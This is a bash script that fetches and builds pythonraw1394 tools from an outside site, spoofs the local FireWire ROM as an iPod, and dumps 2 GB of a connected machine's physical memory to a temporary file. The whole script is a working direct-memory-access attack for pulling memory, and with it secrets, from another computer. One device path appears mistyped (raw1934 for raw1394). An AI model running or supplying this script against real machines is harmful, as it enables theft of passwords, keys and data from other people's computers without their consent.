#!/bin/bash

DIR=/tmp/$RANDOM
PYTHONRAW=http://www.storm.net.nz/static/files/pythonraw1394-1.0.tar.gz
LOCALPORT=0
REMOTEPORT=1
NODE=0

mkdir -p $DIR && cd $DIR &&
  wget --continue -O- $PYTHONRAW | tar xvf - &&
  cd pythonraw1394/ &&
  sudo apt-get install -y libraw1394 libraw1394-dev swig python-dev build-essential &&
  sed -i 's/python2\.3/python2\.6/g' Makefile &&
  make &&
  sudo modprobe raw1394 &&
  sudo chgrp $USER /dev/raw1934 &&
  ./businfo &&
  ./romtool -g $LOCALPORT $DIR/localport.csr &&
  ./romtool -s $LOCALPORT ipod.csr &&
  ./1394memimage $REMOTEPORT $NODE $DIR/memdump 0 2G &&
  echo Success, please read the memory at $DIR/memdump || echo Failure
